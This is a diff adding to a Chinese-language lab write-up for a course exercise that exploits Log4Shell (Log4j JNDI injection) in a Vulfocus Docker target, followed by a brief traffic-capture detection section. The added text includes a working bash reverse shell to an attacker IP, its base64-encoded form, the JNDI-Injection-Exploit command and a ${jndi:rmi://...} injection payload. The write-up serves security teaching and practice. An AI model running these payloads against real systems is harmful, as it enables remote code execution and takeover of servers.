@@ -111,7 +111,7 @@ docker pull vulfocus/vulfocus:latest
 docker exec -it optimistic_blackwell bash
 ```
 
-[![intothecontainer](img/intothecontainer.png)](https://github.com/Xuyan-cmd/Network-security-attack-and-defense-practice/blob/rock/img/intothecontainer.png)
+![intothecontainer](img/intothecontainer.png)
 
 ![lsdockercontainer](img/lsdockercontainer.png)
 
@@ -148,15 +148,126 @@ curl -X POST http://192.168.144.5:44940/hello -d payload='"${jndi:ldap://9fkjt1.
 
 反复试验无果后，决定换一种思路达成实验结果
 
+攻击者主机attacker上下载[`JNDIExploit`工具](https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip)
+
+```
+https://github.com/bkfish/Apache-Log4j-Learning.git
+```
+
+解压
+
+```
+unzip JNDIExploit.v1.2.zip
+```
+
+攻击者主机attacker启动777端口，等待受害者主机victim反弹回连getshell
+
+```
+nc -l -p 7777
+```
+
+![img](img/Startthelisteningport.png)
+
+应用工具JNDI-Injection-Exploit搭建服务，格式：
+
+```
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “命令” -A “ip（攻击机）”
+```
+
+这里的命令是想要靶机运行的命令，-A后放的是发出攻击的电脑的ip，也是存放-C后“命令”的ip地址。
+
+构造反弹shell的payload
+
+```
+bash -i >& /dev/tcp/192.168.56.105/7777 0>&1
+```
+
+将其进行base64加密
+
+```
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwNS83Nzc3IDA+JjE=
+```
+
+执行JNDI-Injection-Exploit
+
+```
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwNS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}" -A 192.168.56.105
+```
+
+![img](img/Startjavamonitoring.png)
+
+使用Burp Suite进行抓包，修改`GET 192.168.56.107:28490/hello?payload=111`的payload参数为上图框选的内容并进行编码
+
+```
+${jndi:rmi://192.168.56.105:1099/5ekovi}
+```
+
+![img](img/Modifypayloadparameters.png)
+
+发送后，即可发现攻击者主机的监听窗口反弹shell
+
+![img](img/bounceshellwindow.png)
+
+查看flag
+
+```
+ls /temp
+```
+
+![img](img/getflag1.png)
+
+```
+flag-{bmh20c56a41-fc29-44f1-9da4-0e3b7bbfb8ff}
+```
+
+在管理界面提交该flag通过
+
+![img](img/getflag2.png)
 
 
 
+#### 流量检测与防护
 
+使用 Docker 的网络命名空间和网络抓包工具来捕获和分析流量。
 
+- 获取容器的 PID（进程ID）
 
+```
+# 查看容器运行情况
+docker ps
 
+docker inspect -f '{{.State.Pid}}' <container_name>
+# 请将 <container_name> 替换为要监视流量的容器的名称
+```
 
+![img](img/findPID.png)
 
+- 使用 `nsenter` 命令进入容器的网络命名空间
 
-### 漏洞利用检测
+```
+nsenter -t <container_pid> -n
+# 将 <container_pid> 替换为上一步中获取到的容器 PID
+```
+
+- 使用网络抓包工具（如 `tcpdump` 或 `tshark`）来捕获和分析流量
+
+```
+tcpdump -i eth0 -w captured_traffic.pcap
+```
+
+这将在容器的 eth0 网络接口上捕获流量，并将结果保存到 `captured_traffic.pcap` 文件中
+
+![img](img/openmonitor.png)
+
+在`captured_traffic.pcap` 文件中可以查看到所有访问到容器的流量
+
+![img](img/suspectedtraffic.png)
+
+可以查看到疑似远程代码执行的攻击流量
+
+## 参考链接
+
+- [网络安全(2021)综合实验](https://www.bilibili.com/video/BV1p3411x7da/?p=22&spm_id_from=pageDriver&vd_source=61a1cf010feeebc60643481f16fc695e)
+- [解决Request method 'POST' not supported问题](https://blog.csdn.net/qq_34868715/article/details/95938843) 
+- [网络安全](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html)
 
